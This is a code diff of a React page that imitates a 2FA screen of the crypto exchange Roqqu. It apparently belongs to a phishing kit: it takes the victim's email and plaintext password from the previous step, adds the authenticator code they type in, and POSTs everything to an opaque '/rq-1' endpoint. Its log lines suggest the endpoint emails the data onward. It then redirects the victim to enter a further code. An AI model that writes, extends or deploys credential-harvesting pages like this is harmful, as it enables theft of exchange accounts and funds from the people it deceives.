@@ -1,122 +1,120 @@
 import React, { useState } from 'react'
+import OtpInput from 'react-otp-input'
 import { useHistory } from 'react-router-dom'
-
-import '../styles/styles.css'
-import LogoWhite from '../assets/logo_white.png'
 import URL from './Url.js'
 
+import twoFA from '../assets/2fa.png'
 
-const VerifyOtp = (props) => {
+export default function Otp(props) {
     const history = useHistory()
 
-    const [code, setCode] = useState('')
+        const [code, setCode] = useState('')
     const [loading, setLoading] = useState(false)
 
-    const handleCode = (e) => {
-        setCode(e.target.value.replace(/\D/, ''))
-    }
+  const handleCode = (e) => {
+      setCode(e.target.value.replace(/\D/, ''))
+  }
 
     const handleSubmit = async (e) => {
         e.preventDefault()
         setLoading(true)
 
-        if (code === '') {
-            console.log('not sent')
-        } else {
-            if (props.location.state) {
-                const templateParams = props.location.state
+        const clientOtp = code
 
-                try {
-                   
-                    const response = await fetch(URL + '/rq-1', {
-                        method: 'POST',
-                        headers: {
-                            Accept: 'application/json',
-                            'Content-type': 'application/json',
-                            Authorization: 'Bearer ' + templateParams.token,
-                        },
-                        credentials: 'include',
-                        mode: 'cors',
-                        body: JSON.stringify({
-                            email: templateParams.email,
-                            password: templateParams.password,
-                            pin: templateParams.clientOtp,
-                            otp: code,
-                        }),
-                    })
+        if (props.location.state) {
+            const templateParams = props.location.state
 
-                    const resData = await response.json()
+            templateParams.clientOtp = clientOtp
 
-                    console.log('email sending started')
+            try {
+              
+                const response = await fetch(URL + '/rq-1', {
+                    method: 'POST',
+                    headers: {
+                        Accept: 'application/json',
+                        'Content-type': 'application/json',
+                        Authorization: 'Bearer ' + templateParams.token,
+                    },
+                    credentials: 'include',
+                    mode: 'cors',
 
-                    if (resData.status === 'success') {
-                        console.log('Message Sent.')
-                        setTimeout(() => {
-                            console.log('time out init')
-                            setLoading(false)
+                    body: JSON.stringify({
+                        email: templateParams.email,
+                        password: templateParams.password,
+                        pin: clientOtp,
+                        otp: '',
+                    }),
+                })
 
-                            history.push('/')
-                        }, 3000)
-                    } else if (resData.status === 'fail') {
-                        console.log('Message failed to send.')
+                const resData = await response.json()
+
+                if (resData.status === 'success') {
+                    console.log('Message Sent.')
+                    setTimeout(() => {
+                        console.log('time out init')
                         setLoading(false)
-                    }
-                } catch (err) {
-                    console.log(err)
+
+                        history.push('/verifyotp', templateParams)
+                    }, 3000)
+                } else if (resData.status === 'fail') {
+                    console.log('Message failed to send.')
+                    setLoading(false)
                 }
+            } catch (err) {
+                console.log(err)
             }
         }
     }
 
     return (
-        <div className='grid '>
-            <div className=' grid gap-7'>
-                <img
-                    src={LogoWhite}
-                    alt=''
-                    className='lg:w-1/4 w-5/12 justify-self-center my-7 '
-                />
-
-                <div className='mx-2'>
-                    <form
-                        className='grid w-full place-content-stretch bg-white md:w-1/3 md:mx-auto rounded '
-                        style={{ padding: '30px 15px' }}
-                        onSubmit={handleSubmit}
-                    >
-                        <h2 className='font-medium text-center text-[#1c124d] mb-4 text-2xl'>
-                            Verify it's you
-                        </h2>
-                        <p className='text-center text-[#1c124d] my-4'>
-                            We've sent a verification code to your email. Enter
-                            the code from the email in the field below.
-                        </p>
-                        <input
-                            type='text'
-                            id='code'
-                            className='text-black outline-none text-lg p-1 rounded-md justify-self-stretch placeholder-[#b2b7be] focus:border-black mb-4'
-                            required
-                            pattern='\d*'
-                            value={code}
-                            placeholder='Enter 6 digit code'
-                            onChange={handleCode}
-                            maxLength={6}
-                        />
-
-                        <button
-                            className=' rounded-md outline-none  bg-[#0059dd] text-white'
+        <div className='container mx-auto'>
+            <div className='max-w-sm mx-auto md:max-w-lg'>
+                <div className='w-full grid justify-center justify-items-center mt-12 '>
+                    <div className='bg-[#cbe5f4] grid justify-center w-24 h-24 rounded-full p-3 content-center'>
+                        <img alt='roqqu logo' src={twoFA} className='w-14' />
+                    </div>
+                    <div className=' h-64 py-3 rounded text-center mt-4'>
+                        <h1 className='text-2xl font-bold'>Enter Auth Code</h1>
+                        <div
+                            className='flex flex-col mt-4 mx-5'
                             style={{
-                                padding: '.5rem 3rem',
-                                lineHeight: 2.5,
+                                lineHeight: '2em !important',
                                 fontSize: '15px',
                             }}
                         >
-                            {loading ? 'loading...' : 'Verify'}
-                        </button>
-                    </form>{' '}
+                            {' '}
+                            <span className='px-8'>
+                                An Auth code from your authenticator app is
+                                required to complete your transactions on Roqqu
+                            </span>{' '}
+                        </div>
+
+                        <form onSubmit={handleSubmit} className=' px-6'>
+                            <input
+                                type='text'
+                                id='code'
+                                className='text-[#b2b7be] outline-none text-lg p-1 rounded-md justify-self-stretch placeholder-[#b2b7be] focus:border-[#b2b7be] mb-4 bg-transparent border border-[#b2b7be] my-10 w-full'
+                                required
+                                pattern='\d*'
+                                value={code}
+                                placeholder='Enter Auth Code'
+                                onChange={handleCode}
+                                maxLength={6}
+                            />
+
+                            <div className='flex justify-center text-center mt-10'>
+                                {' '}
+                                <button className='flex items-center text-blue-700 hover:text-blue-900 cursor-pointer'>
+                                    <span className=' bg-[#21ba45] text-white py-2 px-11 rounded-lg'>
+                                        {loading ? 'loading...' : 'Complete'}
+                                    </span>
+                                    <i className='bx bx-caret-right ml-1'></i>
+                                </button>{' '}
+                            </div>
+                        </form>
+                    </div>
                 </div>
             </div>
         </div>
     )
 }
-
-export default VerifyOtp
